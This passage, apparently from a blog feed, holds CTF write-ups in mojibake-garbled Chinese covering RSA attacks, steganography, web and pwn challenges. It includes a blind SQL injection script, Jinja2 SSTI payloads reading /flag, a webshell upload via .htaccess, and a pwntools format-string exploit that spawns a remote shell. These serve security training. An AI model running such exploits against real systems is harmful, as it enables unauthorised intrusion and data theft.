class="hljs-built_in">range</span>(num%<span class="hljs-number">10</span>,<span class="hljs-number">10</span>):<br>                detext=<span class="hljs-string">&#x27;&#x27;</span><br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(text)):<br>                    <span class="hljs-keyword">if</span> text[i].isnumeric():<br>                        decup=(<span class="hljs-built_in">ord</span>(text[i])-<span class="hljs-number">0x30</span>+j)%<span class="hljs-number">10</span><br>                        detext+=<span class="hljs-built_in">chr</span>(decup+<span class="hljs-number">0x30</span>)<br>                    <span class="hljs-keyword">else</span>:<br>                        detext+=text[i]<br>                self.delist.append(detext)<br>                <span class="hljs-keyword">if</span> num:<br>                    self.detext=detext<br>        <span class="hljs-keyword">elif</span> self.<span class="hljs-type">Type</span>==<span class="hljs-number">3</span>:<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num%<span class="hljs-number">26</span>,<span class="hljs-number">26</span>):<br>                <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num%<span class="hljs-number">10</span>,<span class="hljs-number">10</span>):<br>                    detext=<span class="hljs-string">&#x27;&#x27;</span><br>                    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(text)):<br>                        <span class="hljs-keyword">if</span> text[i].isupper():<br>                            decup=(<span class="hljs-built_in">ord</span>(text[i])-<span class="hljs-number">65</span>+j)%<span class="hljs-number">26</span><br>                            detext+=<span class="hljs-built_in">chr</span>(decup+<span class="hljs-number">65</span>)<br>                        <span class="hljs-keyword">elif</span> text[i].islower():<br>                            decup=(<span class="hljs-built_in">ord</span>(text[i])-<span class="hljs-number">97</span>+j)%<span class="hljs-number">26</span><br>                            detext+=<span class="hljs-built_in">chr</span>(decup+<span class="hljs-number">97</span>)<br>                        <span class="hljs-keyword">elif</span> text[i].isnumeric():<br>                            decup=(<span class="hljs-built_in">ord</span>(text[i])-<span class="hljs-number">0x30</span>+k)%<span class="hljs-number">10</span><br>                            detext+=<span class="hljs-built_in">chr</span>(decup+<span class="hljs-number">0x30</span>)<br>                        <span class="hljs-keyword">else</span>:<br>                            detext+=text[i]<br>                    self.delist.append(detext)<br>                    <span class="hljs-keyword">if</span> num:<br>                        self.detext=detext;<br>        <span class="hljs-keyword">elif</span> self.<span class="hljs-type">Type</span>==<span class="hljs-number">4</span>:<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num%<span class="hljs-number">128</span>,<span class="hljs-number">128</span>):<br>                detext=<span class="hljs-string">&#x27;&#x27;</span><br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(text)):<br>                    decup=(<span class="hljs-built_in">ord</span>(text[i])-<span class="hljs-number">128</span>+j)%<span class="hljs-number">128</span><br>                    detext+=<span class="hljs-built_in">chr</span>(decup)<br>                self.delist.append(detext)<br>                <span class="hljs-keyword">if</span> num:<br>                    self.detext=detext<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.detext):<br>            <span class="hljs-keyword">return</span> self.detext<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.delist):<br>            <span class="hljs-keyword">return</span> self.delist<br></code></pre></td></tr></table></figure>
<p>ä¸¤æ¬¡base64å¾—åˆ°flag<br><img src="/img/wp/2021/2021jinzhuan-3.png"></p>
<h2 id="Crypto-3"><a href="#Crypto-3" class="headerlink" title="Crypto-3"></a>Crypto-3</h2><p>å…ˆåˆ†è§£n<br><img src="/img/wp/2021/2021jinzhuan-4.png"></p>
<p>eå’Œphiä¸äº’ç´ </p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><br>n = <span class="hljs-number">22418636922065508104264650472638100390507346675022700253583060418349386472260539292033574216754214047540225287240029292436219548116787251605020424767984000804727346173028308816952737183433110999995264950414364145519999339949396799207404153148796900954086093431917244453864253649011176295266497073733547832171165497506613139960587280135867463235266546869960044777350378595302570142110464582590415694749192915651700844268466357439219626769665355230647219887042871785185100743750953935872489085346311527806979246650668966304323450610041756764667276881295676841136337294903126776228640645138477063815764467811948872156311</span><br>e = <span class="hljs-number">180</span><br>c = <span class="hljs-number">17971123746814947059314270113966290245749007752378241906733564181493060407114219968936077930494933520528427074831694818994710527963410153282657079091353179846750982127804195747725871635911272654572811618799762595633801414107052800867035212498914627567940429340162711284873714117628807667324064684965941290688518710890089086623981356782977499005308798890348799101436318386502089586589964942282091818134339082321114129830959264557408611168516265190076744300272908807347811446203373025446057616713876047942653095947804696077860211107853183353180163392501353685418796451123620066941329424857070023018877454625734091037559</span><br>q = <span class="hljs-number">149728544112555599590936673615696271318636529352637830106348687941183054498250042553549708433208468004536400117026086238076264785396396599290721801532887662723160698502186620809003309343021490868380464762486274154096814166441270611631342173101926176645742035350917214925625954628200341278782929951624259583527</span><br>p = <span class="hljs-number">149728544112555599590936673615696271318636529352637830106348687941183054498250042553549708433208468004536400117026086238076264785396396599290721801532887662723160698502186620809003309343021490868380464762486274154096814166441270611631342173101926176645742035350917214925625954628200341278782929951624259582993</span><br><br>n1=n-p-q+<span class="hljs-number">1</span><br>t=gmpy2.gcd(e,n1)<br>e=e//t<br>d=gmpy2.invert(e,n1)<br>m=gmpy2.powmod(c,d,n)<br>msg=gmpy2.iroot(m,t)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(msg[<span class="hljs-number">0</span>])[<span class="hljs-number">2</span>:]))<br></code></pre></td></tr></table></figure>

<p><img src="/img/wp/2021/2021jinzhuan-5.png"></p>
<h2 id="Crypto-4"><a href="#Crypto-4" class="headerlink" title="Crypto-4"></a>Crypto-4</h2><p>ADFGVXè§£å¯†<br>ç™¾åº¦å¾—åˆ°<a href="https://blog.csdn.net/euzen/article/details/119085350">åŸé¢˜</a></p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc-1"></a>Misc-1</h2><p>ç›´æ¥strings<br><img src="/img/wp/2021/2021jinzhuan-6.png"></p>
<h2 id="Misc-2"><a href="#Misc-2" class="headerlink" title="Misc-2"></a>Misc-2</h2><p>binwalkåˆ†è§£å‡ºä¸€å †zlibæ–‡ä»¶<br>ä½¿ç”¨<code>ls | grep -v zlib | xargs strings</code>å‘½ä»¤å¯ä»¥å‘ç°ç»“å°¾æœ‰ä¸€ä¸²å­—ç¬¦ä¸²<br>ä¸¤æ¬¡base64åå¾—åˆ°flag</p>
<h2 id="Misc-3"><a href="#Misc-3" class="headerlink" title="Misc-3"></a>Misc-3</h2><p>æ–‡ä»¶å°¾å‘ç°<code>id you try lsb?</code><br>stegsolveå‘ç°<code>ff d8</code>,å¦å­˜ä¸ºjpg<br><img src="/img/wp/2021/2021jinzhuan-7.png"></p>
<p>åå…­è¿›åˆ¶æ¨¡å¼ä¸‹å‘ç°ä¸€ä¸²å­—ç¬¦ä¸²<br><img src="/img/wp/2021/2021jinzhuan-8.png"></p>
<p>base64è§£å¯†åå¾—åˆ°flag</p>
<h2 id="Misc-4"><a href="#Misc-4" class="headerlink" title="Misc-4"></a>Misc-4</h2><p>éŸ³é¢‘æ–‡ä»¶ï¼Œæ’­æ”¾åå…·æœ‰éå¸¸æ˜æ˜¾çš„sstvç‰¹å¾<br>åœ¨æ‰‹æœºä¸Šä½¿ç”¨<code>robot36</code>ç›‘å¬å¾—åˆ°flag</p>
<p><img src="/img/wp/2021/2021jinzhuan-9.png"></p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web-1"></a>Web-1</h2><p>åœ¨jsä¸­å¯ä»¥çœ‹åˆ°æ¸¸æˆçš„é€»è¾‘<br><img src="/img/wp/2021/2021jinzhuan-10.png"></p>
<p>è®¿é—®<code>23881361B86C77CD.php</code>ï¼Œç‚¹å‡»<code>keyåœ¨è¿™é‡Œ</code>ä¼šè·³è½¬ï¼ŒæŠ“åŒ…ï¼Œåœ¨è¿”å›å€¼ä¸­å¾—åˆ°flag</p>
<p><img src="/img/wp/2021/2021jinzhuan-11.png"></p>
<h2 id="Web-2"><a href="#Web-2" class="headerlink" title="Web-2"></a>Web-2</h2><p>ç®€å•è¿‡æ»¤çš„sqlç›²æ³¨<br>expï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sqlinjet</span>(<span class="hljs-params">url,payload</span>):<br>    header=&#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36&#x27;</span>,<br>        <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&quot;UM_distinctid = 175b18dcb384ba-0f290792fb4f06-230346d-144000-175b18dcb39493;CNZZDATA1261218610 =1200642698-1605001662-%7C1605366994&quot;</span>,<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span><br>            &#125;<br>    flag=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>        low = <span class="hljs-number">32</span><br>        high = <span class="hljs-number">128</span><br>        mid = (low + high) // <span class="hljs-number">2</span><br>        <span class="hljs-keyword">while</span>(low &lt; high):<br>            data = &#123;<br>                <span class="hljs-string">&#x27;uname&#x27;</span>: payload.<span class="hljs-built_in">format</span>(i,mid),<br>                <span class="hljs-string">&#x27;passwd&#x27;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>            &#125;<br>            r = requests.post(url=url,data=data,headers=header)<br>            <span class="hljs-built_in">print</span>(data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;ä¸å­˜åœ¨æ­¤ç”¨æˆ·&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>               low = mid + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>               high = mid<br>            mid = (low + high) // <span class="hljs-number">2</span><br>        flag += <span class="hljs-built_in">chr</span>(mid)<br>        <span class="hljs-built_in">print</span>(flag)<br>        <span class="hljs-keyword">if</span> mid == <span class="hljs-number">32</span> <span class="hljs-keyword">or</span> mid == <span class="hljs-number">132</span>:<br>            <span class="hljs-keyword">break</span><br><br>url=<span class="hljs-string">&#x27;http://101.133.132.222:8002/login.php&#x27;</span><br>payload_all_database=<span class="hljs-string">&quot;&quot;</span><br>payload_database=<span class="hljs-string">&quot;1&#x27;^(ascii(substring((select(database()))from(&#123;&#125;)))&gt;&#123;&#125;)^&#x27;1&quot;</span><br>payload_table=<span class="hljs-string">&quot;1&#x27;^(ascii(substring((select(group_concat(table_name))from(sys.schema_auto_increment_columns)where(table_schema=database()))from(&#123;&#125;)))&gt;&#123;&#125;)^&#x27;1&quot;</span><br><br>uname=<span class="hljs-string">&quot;1&#x27;^(ascii(substring((select(group_concat(uname))from(admin))from(&#123;&#125;)))&gt;&#123;&#125;)^&#x27;1&quot;</span><br>password=<span class="hljs-string">&quot;1&#x27;^(ascii(substring((select(group_concat(passwd))from(admin))from(&#123;&#125;)))&gt;&#123;&#125;)^&#x27;1&quot;</span><br>sqlinjet(url,password)<br></code></pre></td></tr></table></figure>

<p>æ³¨å…¥å¾—åˆ°å¯†ç ï¼Œmd5è§£å¯†åå¾—åˆ°<code>5555666</code></p>
<p><img src="/img/wp/2021/2021jinzhuan-12.png"></p>
<p>ç™»å½•æ‹¿åˆ°flag</p>
<h2 id="Web-4"><a href="#Web-4" class="headerlink" title="Web-4"></a>Web-4</h2><p>æ‰«æç›®å½•å¾—åˆ°<code>index.php.bak</code><br><img src="/img/wp/2021/2021jinzhuan-13.png"></p>
<p>å¾—åˆ°éƒ¨åˆ†æºä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pwd&#x27;</span>])<br></code></pre></td></tr></table></figure>
<p>phpå¼±æ¯”è¾ƒï¼Œä¼ å…¥ä¸¤ä¸ªæ•°ç»„å³å¯</p>
<p>payload:<br><code>http://101.133.132.222:8004/index.php?name[]=admin&amp;pwd[]=admin123</code></p>
<h2 id="Web-5"><a href="#Web-5" class="headerlink" title="Web-5"></a>Web-5</h2><p>é¢˜ç›®urlåçš„è·¯å¾„å¯æ§ï¼Œä¼šç›´æ¥å›æ˜¾å‡ºæ¥<br>å°è¯•<code>xss</code>å’Œ<code>ssti</code><br>å‘ç°å­˜åœ¨<code>xss</code>ï¼Œä½†æ˜¯<code>xss</code>ä¸å¥½åˆ©ç”¨ï¼Œä½¿ç”¨<code>&#123;&#123;7*7&#125;&#125;</code>æµ‹è¯•ï¼Œå‘ç°ä¹Ÿå­˜åœ¨<code>ssti</code>æ³¨å…¥</p>
<p>æŠ¥é”™åå¾—åˆ°æ¡†æ¶æ˜¯<code>jinja2</code></p>
<p>fuzzåå‘ç°è¿‡æ»¤äº†<code>class.</code>å…³é”®å­—ï¼Œå¯ä»¥é€šè¿‡åŠ å·æ‹¼æ¥<code>class</code>æ¥ç»•è¿‡</p>
<p>å…ˆè·å–<code>FileLoader</code>ç±»<br><code>http://101.133.132.222:8005/&#123;&#123;()['__cla'+'ss__'].__base__['__subclas'+'ses__']()&#125;&#125;</code></p>
<p><img src="/img/wp/2021/2021jinzhuan-14.png"></p>
<p>è°ƒç”¨ç±»<code>get_data</code>æ–¹æ³•è¯»æ–‡ä»¶<br><code>http://101.133.132.222:8005/&#123;&#123;()['__cla'+'ss__'].__base__['__subclas'+'ses__']()[79]["get_data"](0,"/flag")&#125;&#125;</code></p>
<p><img src="/img/wp/2021/2021jinzhuan-15.png"></p>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Reverse-1"><a href="#Reverse-1" class="headerlink" title="Reverse-1"></a>Reverse-1</h2><p>ç›´æ¥strings<br><img src="/img/wp/2021/2021jinzhuan-16.png"></p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="Pwn-1"><a href="#Pwn-1" class="headerlink" title="Pwn-1"></a>Pwn-1</h2><p>æŸ¥çœ‹ä»£ç å‘ç°<code>main</code>å‡½æ•°ä¸­å­˜åœ¨ä¸¤æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²</p>
<p>é€šè¿‡ç¬¬ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²è·å–<code>__libc_start_main</code>å‡½æ•°åœ°å€<br>åŒæ—¶è·å–<code>libc</code>åœ°å€ï¼Œé€šè¿‡<code>libc</code>è·å–<code>system</code>å‡½æ•°åœ°å€</p>
<p>é€šè¿‡ç¬¬äºŒæ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²å°†<code>fini_array</code>æ›¿æ¢ä¸º<code>main</code>å‡½æ•°<br>ä½¿æˆ‘ä»¬å¯ä»¥å†æ¬¡è¾“å…¥æ•°æ®ï¼Œå¹¶æŠŠ<code>printf</code>å‡½æ•°åœ¨<code>got</code>è¡¨ä¸­çš„æ•°æ®ä¿®æ”¹ä¸º<code>system</code>å‡½æ•°åœ°å€<br>è¿™æ ·åœ¨ç¬¬äºŒæ¬¡æ‰§è¡Œ<code>main</code>å‡½æ•°æ—¶ï¼Œè¾“å…¥<code>/bin/sh</code>æˆ–<code>sh</code>å°±å¯ä»¥æ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>æ¥è·å–<code>shell</code>äº†</p>
<p><img src="/img/wp/2021/2021jinzhuan-17.png"></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>libc=ELF(<span class="hljs-string">&#x27;libc-2.23.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>e=ELF(<span class="hljs-string">&#x27;./pmagic&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>p=remote(<span class="hljs-string">&#x27;106.14.91.65&#x27;</span>,<span class="hljs-number">10000</span>)<br><span class="hljs-comment">#p=process(&#x27;pmagic&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p,&#x27;bp 0x400838&#x27;)</span><br>p.readuntil(<span class="hljs-string">&#x27;name.\n&#x27;</span>)<br>p.send(<span class="hljs-string">&#x27;%43$p&#x27;</span>)<br>d=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;Say&#x27;</span>,drop=<span class="hljs-number">1</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)-<span class="hljs-number">240</span><br>libc.address=d-libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>fini=<span class="hljs-number">0x600a78</span><br>printf=e.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>main=<span class="hljs-number">0x400797</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(main))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(fini))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(system))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(printf))<br><br>a=[<span class="hljs-number">0x97</span>,<span class="hljs-number">0x7</span>,<span class="hljs-number">0x40</span>]<br>i=system<br><span class="hljs-keyword">while</span> i!=<span class="hljs-number">0</span>:<br>    a.append(i&amp;<span class="hljs-number">0xff</span>)<br>    i=i&gt;&gt;<span class="hljs-number">8</span><br><br><br>b=[fini,fini+<span class="hljs-number">1</span>,fini+<span class="hljs-number">2</span>,printf,printf+<span class="hljs-number">1</span>,printf+<span class="hljs-number">2</span>,printf+<span class="hljs-number">3</span>,printf+<span class="hljs-number">4</span>,printf+<span class="hljs-number">5</span>]<br>c=&#123;&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(a)):<br>    c[a[i]]=b[i]<br><br>a.sort()<br><span class="hljs-built_in">print</span>(a)<br><span class="hljs-built_in">print</span>(b)<br><span class="hljs-built_in">print</span>(c)<br>payload=<span class="hljs-string">&#x27;&#x27;</span><br>n=<span class="hljs-number">0</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(a)):<br>    <span class="hljs-keyword">if</span> i&gt;<span class="hljs-number">0</span>:<br>        payload+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(a[i]-a[i-<span class="hljs-number">1</span>])+<span class="hljs-string">&#x27;c%&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-number">28</span>+i)+<span class="hljs-string">&#x27;$hhn&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        payload+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(a[i])+<span class="hljs-string">&#x27;c%&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-number">28</span>+i)+<span class="hljs-string">&#x27;$hhn&#x27;</span><br>    n=n+<span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload)))<br>payload=payload.ljust(<span class="hljs-number">0xa0</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    payload+=p64(c[i])<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload)))<br><span class="hljs-built_in">print</span>(payload)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="/img/wp/2021/2021jinzhuan-18.jpg"></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2021</tag>
        <tag>é‡‘ç –</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¬¬äºŒå±Švecctf-wp</title>
    <url>/posts/e6acd4f1/</url>
    <content><![CDATA[<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="zip-guessing"><a href="#zip-guessing" class="headerlink" title="zip-guessing"></a>zip-guessing</h2><p>æ‰“å¼€å‹ç¼©åŒ…å‘ç°æç¤º<code>password=.......py</code></p>
<p>è¿›è¡Œ6ä½å¯†ç çˆ†ç ´ï¼Œå¾—åˆ°å¯†ç <code>3a1b6c</code></p>
<p>è§£å‹å¾—åˆ°flag</p>
<blockquote>
<p>flag{fa8d910600a5467d9d2f433f2bba4c80}</p>
</blockquote>
<h2 id="Spiderman"><a href="#Spiderman" class="headerlink" title="Spiderman"></a>Spiderman</h2><p>ä¿®æ”¹é«˜åº¦ï¼Œå‘ç°å­—ç¬¦ä¸²<code>READMEï¼šHAHAyoufoundIT</code></p>
<p>binwalkåˆ†ç¦»å‡ºä¸€ä¸ªå¸¦å¯†ç çš„å‹ç¼©åŒ…</p>
<p>å‹ç¼©åŒ…ä¸­å«æœ‰ä¸€ä¸ªåä¸º<code>README.txt</code>çš„æ–‡ä»¶<br>å°†<code>HAHAyoufoundIT</code>å†™å…¥<code>README.txt</code>å¹¶å‹ç¼©æˆzipæ–‡ä»¶åå‘ç°ä¸¤ä¸ª<code>README.txt</code>çš„crcä¸€è‡´</p>
<p><img src="/img/wp/2022/2022vec-1.png"></p>
<p>é‡‡ç”¨æ˜æ–‡çˆ†ç ´å‡ºå¯†ç <code>!g^c*0</code><br><img src="/img/wp/2022/2022vec-2.png"></p>
<p>è§£å‹åå¾—åˆ°ä¸€å¼ png</p>
<p><code>stegsolve</code>åˆ†æå›¾ç‰‡ï¼Œå‘ç°<code>0</code>é€šé“ä¸­è—æœ‰flag</p>
<blockquote>
<p>flag{Z1p_1maGE_lSB_1nterestiNG}</p>
</blockquote>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="baby-rsa"><a href="#baby-rsa" class="headerlink" title="baby rsa"></a>baby rsa</h2><p>å› ä¸ºä¸¤ç»„æ•°æ®çš„Nç›¸åŒï¼Œå°è¯•å…±æ¨¡æ”»å‡»</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> gmpy2<br>n,e1 = (<span class="hljs-number">18278250860121129714191417969518671565676609370438974713591911937173608105906651505337301762681939894104610580889645217298111784819358890536088923234106589063389221021186473430580352803412280849862104635302801082728967968107748121682339447067731887326087497520544915737621714860811217331095698945949486830528216492874665673677441699322439459330337628648399309373351992766984612437555092804129107438390294123179182945321411199463748963590901018595492869891970965012682196059824464339830536600021131729277503225240822584625293463254992623570796895110736563514265569133338477447460712899749955523316083254492005199917987</span>, <span class="hljs-number">76831</span>)<br>c1 = <span class="hljs-number">14068017239200053057485191549313171235040341952680207740172042657952395329165768631549600187463451884623632792268314205814005668826033658861436424617991125160661381291003863394279707111450435808077534541510943745285958554921154542813613390731768463465972495263609910077893559813685204864361223917445770159726623708768996447642959844639282015350260298045019617026128700143368357847147111693153254268063490280666808714031170237337721534721243540077707555520501582047389390048200750092516532861791678414405037042484148584170396597267139826760931348123330503380212299827883145622326471261247290265669559897644089748984204</span><br>n,e2 = (<span class="hljs-number">18278250860121129714191417969518671565676609370438974713591911937173608105906651505337301762681939894104610580889645217298111784819358890536088923234106589063389221021186473430580352803412280849862104635302801082728967968107748121682339447067731887326087497520544915737621714860811217331095698945949486830528216492874665673677441699322439459330337628648399309373351992766984612437555092804129107438390294123179182945321411199463748963590901018595492869891970965012682196059824464339830536600021131729277503225240822584625293463254992623570796895110736563514265569133338477447460712899749955523316083254492005199917987</span>, <span class="hljs-number">65537</span>)<br>c2 = <span class="hljs-number">17120091052055468753592285548832983539343349280048150965811042901415659935929189229298761316319784219958366772027986939749507760509991462838561325114714990126772560070483939658678703332135866293838146121312972251030190756953273311362066029287803984179301942229948301600814847050270084193184210232673652417884727838290706970298245205101865234726242081382680212621541249662659284218079172180588507736208257188130972936994297239579885142233896240153633237886314935309710560434501987121687537279749951910677771351212584805615709915168729977338949858374823750316083595198620089092891606394712323216539675547753350603350269</span><br>s=gmpy2.gcdext(e1,e2)<br>s1=s[<span class="hljs-number">1</span>]<br>s2=s[<span class="hljs-number">2</span>]<br><span class="hljs-keyword">if</span> s1&lt;<span class="hljs-number">0</span>:<br>    s1=-s1<br>    c1=gmpy2.invert(c1,n)<br><span class="hljs-keyword">else</span>:<br>    s2=-s2<br>    c2=gmpy2.invert(c2,n)<br><br>c1=gmpy2.powmod(c1,s1,n)<br>c2=gmpy2.powmod(c2,s2,n)<br>c=(c1*c2)%n<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:]))<br></code></pre></td></tr></table></figure>

<p><img src="/img/wp/2022/2022vec-3.png"></p>
<blockquote>
<p>flag{423c35691377ea18d35b97b7b6f13590}</p>
</blockquote>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="ezfilter"><a href="#ezfilter" class="headerlink" title="ezfilter"></a>ezfilter</h2><p>æŠ“åŒ…ï¼Œåœ¨å¯†ç å¤„å°è¯•sqlæ³¨å…¥ï¼Œå›æ˜¾äº†mysqlçš„æŠ¥é”™</p>
<p><img src="/img/wp/2022/2022vec-4.png"></p>
<p>fuzzåå‘ç°è¿‡æ»¤äº†ç©ºæ ¼ï¼Œå¯ä»¥ç”¨<code>/**/</code>ä»£æ›¿ç©ºæ ¼</p>
<p>sqlmapè·‘ä¸€ä¸‹å¾—åˆ°flag<br><code>sqlmap -r 1.txt --batch --tamper &quot;space2comment.py&quot; --dump</code></p>
<p><img src="/img/wp/2022/2022vec-5.png"></p>
<blockquote>
<p>flag{30b08224ed436c8c690ae623a89466f3}</p>
</blockquote>
<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>åœ¨æºç ä¸­å‘ç°<code>hint: TUhnd2VEQjRiRzluYVc0dWNHaHc=</code></p>
<p>ä¸¤å±‚base64å¾—åˆ°<code>0x0x0xlogin.php</code></p>
<p>é€šè¿‡å¼±å£ä»¤çˆ†ç ´è¿›å…¥åå° <code>admin</code>,<code>admin123456</code></p>
<p>åœ¨é¡¹ç›®ç®¡ç†å¤„å‘ç°ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ç‚¹</p>
<p>é€šè¿‡å°†æ–‡ä»¶åç½®ç©ºï¼ŒæŠ¥é”™å¾—åˆ°ä¸Šä¼ è·¯å¾„<code>uploaded</code><br><img src="/img/wp/2022/2022vec-6.png"></p>
<p>fuzzåå‘ç°å…è®¸ä¸Šä¼ <code>.htaccess</code><br><img src="/img/wp/2022/2022vec-7.png"></p>
<p>å†ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬å³å¯</p>
<p><img src="/img/wp/2022/2022vec-8.png"></p>
<p>èšå‰‘è¿æ¥å¾—åˆ°flag</p>
<blockquote>
<p>flag{063a5bda0b5a2a5d7b700d989f73902b}</p>
</blockquote>
<h2 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h2><p>æŸ¥çœ‹æºç ï¼š<code>/index.php?source</code></p>
<p>å…³é”®ä»£ç å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;session_id&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;SELECT * FROM secrets WHERE session_id = &#x27;&quot;</span> . <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;session_id&#x27;</span>] . <span class="hljs-string">&quot;&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$query</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;SELECT * FROM secrets WHERE session_id = &#x27;&quot;</span> . <span class="hljs-title function_ invoke__">session_id</span>() . <span class="hljs-string">&quot;&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$query</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>whereåé¢ä¸º<code>true</code>å°±è¡Œäº†</p>
